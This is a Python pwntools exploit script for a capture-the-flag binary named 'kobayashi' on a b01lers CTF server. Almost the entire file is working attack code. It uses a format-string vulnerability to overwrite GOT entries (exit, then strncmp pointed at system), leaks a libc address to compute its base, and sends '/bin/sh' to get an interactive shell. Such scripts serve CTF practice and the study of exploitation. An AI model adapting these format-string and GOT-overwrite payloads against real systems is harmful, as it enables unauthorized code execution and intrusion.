#!/usr/bin/env python

from pwn import *  # pylint: disable=unused-wildcard-import
import os, sys

context(arch="i386")

HOST="pwn.ctf.b01lers.com"
PORT=1006
REMOTE_LIBC="libc.so.6"

BINARY="./kobayashi"
LOCAL_LIBC="/lib/i386-linux-gnu/libc-2.24.so"

if "remote" in sys.argv:
    p = remote(HOST, PORT)
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass
else:
    p = process(BINARY)
    libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-v']  # pylint: disable=assigning-non-slot
    gdb.attach(p, "b *0x804ab52")  # pylint: disable=undefined-variable

########################################################

def get_payload():
    payload = ""

    # main option
    payload += "2\n"

    # need to control leonard 4th to trigger fstr vlun

    # first crew option
    payload += "Nyota\n"
    payload += "1\n"

    # second crew option
    payload += "Scotty\n"
    payload += "1\n"

    # third crew option
    payload += "Janice\n"
    payload += "1\n"

    # fourth (last) crew option
    payload += "Leonard\n"

    return payload

def exploit():
    log.info("wuddup")

    # step 1: partial overwrite exit got w/ main
    main = 0x80486b1 - 5 # printing address

    payload = get_payload()

    fstr = ""
    fstr += p32(elf.got['exit'])
    fstr += "%{}d".format(main&0xffff)
    fstr += "a"
    fstr += "%6$hn"

    log.info("payload 1 length: {}".format(len(fstr)))
    log.info(repr(fstr))

    payload += fstr + "\n"

    p.send(payload)

    # step 2: leak libc

    payload = get_payload()

    fstr = "%5$p"

    payload += fstr + "\n"

    p.send(payload)

    # parse leak
    # this occurs twice b/c we ran it twice
    p.recvuntil("Do you have any dying words?\n")
    p.recvuntil("Do you have any dying words?\n")
    leak = int(p.recv(10), 16)
    log.info("leak: " + hex(leak))
    # libc_base = leak - 0x1b4000 # local
    libc_base = leak - 0x1d5000
    log.info("libc base: " + hex(libc_base))

    # step 3: set exit to the vuln function 
    vuln = 0x804aacd - 5 # -5 b/c print addr + padding

    payload = get_payload()

    fstr = ""
    fstr += p32(elf.got['exit'])
    fstr += "%{}d".format(vuln&0xffff)
    while len(fstr) % 4 != 0:
        fstr += "a"
    fstr += "%6$hn"

    log.info("payload 3 length: {}".format(len(fstr)))
    log.info(repr(fstr))

    payload += fstr + "\n"

    p.send(payload)

    # overwrite strncmp in 2 shots to point to system
    goal = libc_base + libc.symbols['system']
    log.info("full system addr: " + hex(goal))
    goal_l = goal & 0xffff
    goal_l -= 5
    goal_h = (goal & 0xffff0000) >> 16
    goal_h -= 5

    fstr = ""
    fstr += p32(elf.got['strncmp'])
    fstr += "%{}d".format(goal_l)
    while len(fstr) % 4 != 0:
        fstr += "a"
    fstr += "%6$hn"

    log.info("system 1: " + repr(fstr))

    payload = fstr + "\n"

    p.send(payload)

    fstr = ""
    fstr += p32(elf.got['strncmp']+2)
    fstr += "%{}d".format(goal_h)
    while len(fstr) % 4 != 0:
        fstr += "a"
    fstr += "%6$hn"

    log.info("system 2: " + repr(fstr))

    payload = fstr + "\n"

    p.send(payload)

    # set exit back to main
    fstr = ""
    fstr += p32(elf.got['exit'])
    fstr += "%{}d".format(main&0xffff)
    while len(fstr) % 4 != 0:
        fstr += "a"
    fstr += "%6$hn"

    payload = fstr + "\n"

    p.send(payload)

    # trigger
    payload = ""
    payload += "2\n"
    payload += "/bin/sh\n"


    p.send(payload)

    p.recvuntil("Type the member's name:")
    p.recvuntil("Type the member's name:")
    p.recvuntil("Type the member's name:")
    p.interactive()


########################################################

if __name__ == "__main__":
    exploit()
